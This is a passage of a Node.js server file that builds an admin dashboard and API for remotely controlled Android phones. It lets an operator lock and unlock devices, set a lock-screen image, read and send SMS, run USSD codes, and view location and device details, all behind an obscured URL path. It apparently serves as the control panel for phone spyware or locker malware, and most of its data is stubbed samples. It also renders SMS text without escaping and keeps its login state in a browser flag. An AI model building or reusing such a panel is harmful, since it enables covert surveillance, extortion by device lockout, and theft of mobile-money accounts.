    html += '    const response = await fetch(API_BASE + "/api/upload-lock-image", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ image: imageData })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) {\n';
    html += '      document.getElementById("lockImageStatus").textContent = "✅ Image uploaded successfully!";\n';
    html += '      document.getElementById("lockImageStatus").style.color = "#6bcb77";\n';
    html += '    } else {\n';
    html += '      document.getElementById("lockImageStatus").textContent = "❌ " + data.error;\n';
    html += '      document.getElementById("lockImageStatus").style.color = "#ff6b6b";\n';
    html += '    }\n';
    html += '  } catch { alert("Connection error"); }\n';
    html += '}\n';
    html += '\n';
    html += '// ============================================================\n';
    html += '// SMS FUNCTIONS\n';
    html += '// ============================================================\n';
    html += 'async function refreshSms() {\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/sms");\n';
    html += '    const smsList = await response.json();\n';
    html += '    renderSms(smsList);\n';
    html += '    document.getElementById("smsCountBadge").textContent = smsList.length || 0;\n';
    html += '  } catch (error) {\n';
    html += '    console.error("Error loading SMS:", error);\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'function renderSms(messages) {\n';
    html += '  const container = document.getElementById("smsList");\n';
    html += '  if (!messages || messages.length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">💬</div>No SMS messages yet</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>";\n';
    html += '  messages.slice(0, 50).forEach(msg => {\n';
    html += '    const time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : "--";\n';
    html += '    const isShort = msg.number && msg.number.length >= 4 && msg.number.length <= 5;\n';
    html += '    let numberDisplay = msg.number || "Unknown";\n';
    html += '    if (isShort) numberDisplay = \'<span style="color:#ffd700;font-weight:600;">\' + numberDisplay + \'</span>\';\n';
    html += '    html += `<tr><td>${numberDisplay}</td><td>${msg.body || "--"}</td><td style="font-size:12px;color:#8896ab;">${time}</td></tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += 'async function sendSms() {\n';
    html += '  const number = document.getElementById("smsNumber").value.trim();\n';
    html += '  const message = document.getElementById("smsMessage").value.trim();\n';
    html += '  const resultEl = document.getElementById("smsSendResult");\n';
    html += '  if (!number || !message) {\n';
    html += '    resultEl.textContent = "⚠️ Please enter both number and message";\n';
    html += '    resultEl.style.color = "#ff6b6b";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  resultEl.textContent = "⏳ Sending...";\n';
    html += '  resultEl.style.color = "#ffd700";\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/send-sms", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ number, message })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) {\n';
    html += '      resultEl.textContent = "✅ " + data.message;\n';
    html += '      resultEl.style.color = "#6bcb77";\n';
    html += '      document.getElementById("smsNumber").value = "";\n';
    html += '      document.getElementById("smsMessage").value = "";\n';
    html += '      refreshSms();\n';
    html += '    } else {\n';
    html += '      resultEl.textContent = "❌ " + (data.error || "Failed to send");\n';
    html += '      resultEl.style.color = "#ff6b6b";\n';
    html += '    }\n';
    html += '  } catch {\n';
    html += '    resultEl.textContent = "❌ Connection error";\n';
    html += '    resultEl.style.color = "#ff6b6b";\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += '// ============================================================\n';
    html += '// USSD, LOCATION, DEVICE INFO\n';
    html += '// ============================================================\n';
    html += 'async function executeUssd() {\n';
    html += '  const code = document.getElementById("ussdInput").value.trim();\n';
    html += '  const responseEl = document.getElementById("ussdResponse");\n';
    html += '  if (!code) {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "⚠️ Please enter a USSD code";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  responseEl.className = "ussd-response waiting";\n';
    html += '  responseEl.textContent = "⏳ Sending USSD code... waiting for response...";\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/ussd", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ code })\n';
    html += '    });\n';
    html += '    const data = await res.json();\n';
    html += '    if (data.success) {\n';
    html += '      responseEl.className = "ussd-response success";\n';
    html += '      responseEl.textContent = "📥 " + data.message;\n';
    html += '      loadData();\n';
    html += '    } else {\n';
    html += '      responseEl.className = "ussd-response error";\n';
    html += '      responseEl.textContent = "❌ " + (data.error || "Execution failed");\n';
    html += '    }\n';
    html += '  } catch {\n';
    html += '    responseEl.className = "ussd-response error";\n';
    html += '    responseEl.textContent = "❌ Connection error";\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'async function refreshLocation() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/location");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("latValue").textContent = data.lat ?? "--";\n';
    html += '    document.getElementById("lngValue").textContent = data.lng ?? "--";\n';
    html += '    document.getElementById("accValue").textContent = data.accuracy ? data.accuracy + "m" : "--";\n';
    html += '    document.getElementById("locTime").textContent = data.time || "--";\n';
    html += '    if (data.lat && data.lng) {\n';
    html += '      document.getElementById("mapLink").href = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;\n';
    html += '      document.getElementById("mapLink").style.display = "inline";\n';
    html += '    } else {\n';
    html += '      document.getElementById("mapLink").style.display = "none";\n';
    html += '    }\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += '\n';
    html += 'async function refreshDeviceInfo() {\n';
    html += '  try {\n';
    html += '    const res = await fetch(API_BASE + "/api/device-info");\n';
    html += '    const data = await res.json();\n';
    html += '    document.getElementById("diModel").textContent = data.model || "--";\n';
    html += '    document.getElementById("diManufacturer").textContent = data.manufacturer || "--";\n';
    html += '    document.getElementById("diAndroid").textContent = data.android_version || "--";\n';
    html += '    document.getElementById("diBattery").textContent = data.battery ? data.battery + "%" : "--";\n';
    html += '    document.getElementById("diStorage").textContent = data.storage || "--";\n';
    html += '    document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
    html += '  } catch {}\n';
    html += '}\n';
    html += '\n';
    html += 'async function loadData() {\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/stats");\n';
    html += '    const stats = await response.json();\n';
    html += '    document.getElementById("devicesCount").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numbersCount").textContent = stats.ussd_count || 0;\n';
    html += '    document.getElementById("onlineCount").textContent = stats.online || 0;\n';
    html += '    document.getElementById("deviceCountBadge").textContent = stats.devices || 0;\n';
    html += '    document.getElementById("numberCountBadge").textContent = stats.ussd_count || 0;\n';
    html += '    const ussdRes = await fetch(API_BASE + "/api/ussd-numbers");\n';
    html += '    const ussdNumbers = await ussdRes.json();\n';
    html += '    renderUssdNumbers(ussdNumbers);\n';
    html += '    const devices = stats.devices ? [{ name: "Sample Device", status: "online", battery: 85 }] : [];\n';
    html += '    renderDevices(devices);\n';
    html += '  } catch (error) { console.error("Error loading data:", error); }\n';
    html += '}\n';
    html += '\n';
    html += 'function renderDevices(devices) {\n';
    html += '  const container = document.getElementById("devicesList");\n';
    html += '  if (!devices || devices.length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">📱</div>No devices connected yet</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>";\n';
    html += '  devices.forEach(d => {\n';
    html += '    const statusClass = d.status === "online" ? "online" : "offline";\n';
    html += '    const statusText = d.status === "online" ? "🟢 Online" : "🔴 Offline";\n';
    html += '    html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || "--"}%</td></tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += 'function renderUssdNumbers(numbers) {\n';
    html += '  const container = document.getElementById("numbersList");\n';
    html += '  if (!numbers || numbers.length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">📞</div>No USSD codes detected yet</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>";\n';
    html += '  numbers.forEach(n => {\n';
    html += '    html += `<tr><td>${n.device || "Unknown"}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += '// ============================================================\n';
    html += '// PERSISTENT LOGIN\n';
    html += '// ============================================================\n';
    html += 'if (localStorage.getItem("adminLoggedIn") === "true") {\n';
    html += '  document.getElementById("loginContainer").style.display = "none";\n';
    html += '  document.getElementById("dashboard").classList.remove("hidden");\n';
    html += '  loadData();\n';
    html += '  refreshLocation();\n';
    html += '  refreshDeviceInfo();\n';
    html += '  refreshSms();\n';
    html += '  refreshDevicesLock();\n';
    html += '}\n';
    html += '\n';
    html += 'document.getElementById("loginPass").addEventListener("keypress", (e) => {\n';
    html += '  if (e.key === "Enter") login();\n';
    html += '});\n';
    html += '</script>\n';
    html += '</body>\n';
    html += '</html>';

    res.send(html);
});

// ============================================================
// API ENDPOINTS
// ============================================================
app.get('/a9f3k217/api/devices-lock', (req, res) => {
    res.json(devices);
});

app.post('/a9f3k217/api/lock-device', (req, res) => {
    const { deviceId, action } = req.body;
    if (!deviceId || !devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    if (action === 'lock') {
        devices[deviceId].locked = true;
        res.json({ success: true, message: 'Device locked' });
    } else if (action === 'unlock') {
        devices[deviceId].locked = false;
        res.json({ success: true, message: 'Device unlocked' });
    } else {
        res.status(400).json({ error: 'Invalid action' });
    }
});

app.post('/a9f3k217/api/lock-all', (req, res) => {
    Object.keys(devices).forEach(id => { devices[id].locked = true; });
    res.json({ success: true, message: 'All devices locked' });
});

app.post('/a9f3k217/api/unlock-all', (req, res) => {
    Object.keys(devices).forEach(id => { devices[id].locked = false; });
    res.json({ success: true, message: 'All devices unlocked' });
});

app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
    const { image } = req.body;
    if (!image) {
        return res.status(400).json({ error: 'No image provided' });
    }
    lockScreenImage = image;
    res.json({ success: true, message: 'Lock screen image uploaded' });
});

let smsMessages = [
    { number: '12345', body: 'Your account balance is 1,500 RWF', timestamp: Date.now() - 3600000 },
    { number: '1234', body: 'Data bundle: 2GB remaining', timestamp: Date.now() - 7200000 },
    { number: '98765', body: 'Your PIN has been changed successfully', timestamp: Date.now() - 86400000 }
];

app.get('/a9f3k217/api/sms', (req, res) => {
    res.json(smsMessages);
});

app.post('/a9f3k217/api/send-sms', (req, res) => {
    const { number, message } = req.body;
    if (!number || !message) {
        return res.status(400).json({ error: 'Number and message required' });
    }
    smsMessages.unshift({ number, body: message, timestamp: Date.now() });
    if (smsMessages.length > 100) smsMessages.pop();
    res.json({ success: true, message: 'SMS sent' });
});

// ============================================================
// LOGIN API
// ============================================================
app.post('/a9f3k217/api/login', (req, res) => {
    const ip = getClientIP(req);
    const now = Date.now();
    const blockDuration = 12 * 60 * 60 * 1000;

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
        return res.status(401).json({ remainingAttempts: 0 });
    }

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
        delete failedAttempts[ip];
    }

    const { username, password } = req.body;
    const hash = crypto.createHash('sha256').update(password).digest('hex');
    const validUser = username === ADMIN_USER;
    const validPass = validUser && hash === ADMIN_PASS_HASH;

    if (validUser && validPass) {
        delete failedAttempts[ip];
        res.json({ success: true });
    } else {
        if (!failedAttempts[ip]) {
            failedAttempts[ip] = { count: 1, blockUntil: 0 };
        } else {
            failedAttempts[ip].count += 1;
        }

        const remaining = 5 - failedAttempts[ip].count;
        if (remaining <= 0) {
            failedAttempts[ip].blockUntil = now + blockDuration;
            res.status(401).json({ remainingAttempts: 0 });
        } else {
            res.status(401).json({ remainingAttempts: remaining });
        }
    }
});

// ============================================================
// USSD ENDPOINTS
// ============================================================
let ussdNumbers = [];

app.post('/a9f3k217/api/ussd', (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'No USSD code provided' });

    let responseMessage = '';
    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
    else responseMessage = `USSD code ${code} executed. No further response available.`;

    const cleanNumber = code.replace(/\D/g, '');
    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
        ussdNumbers.unshift({
            device: 'Sample Device',
            number: cleanNumber,
            type: 'USSD',
            timestamp: Date.now()
        });
        if (ussdNumbers.length > 100) ussdNumbers.pop();
    }

    res.json({ success: true, message: responseMessage });
});

app.get('/a9f3k217/api/ussd-numbers', (req, res) => res.json(ussdNumbers));
app.get('/a9f3k217/api/stats', (req, res) => {
    res.json({
        devices: 0,
        numbers: ussdNumbers.length,
        online: 0,
        ussd_count: ussdNumbers.length
    });
});
app.get('/a9f3k217/api/location', (req, res) => {
    res.json({
        lat: -1.9441,
        lng: 30.0619,
        accuracy: 15,
        time: new Date().toLocaleString()
    });
});
app.get('/a9f3k217/api/device-info', (req, res) => {
    res.json({
        model: 'Samsung Galaxy S23',
        manufacturer: 'Samsung',
        android_version: '14.0',
        battery: 76,
        storage: '128GB / 89GB used',
        device_id: 'abc123def456'
    });
});
app.get('/a9f3k217/api/devices', (req, res) => res.json([]));

// ============================================================
// 404 HANDLER
// ============================================================
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
});
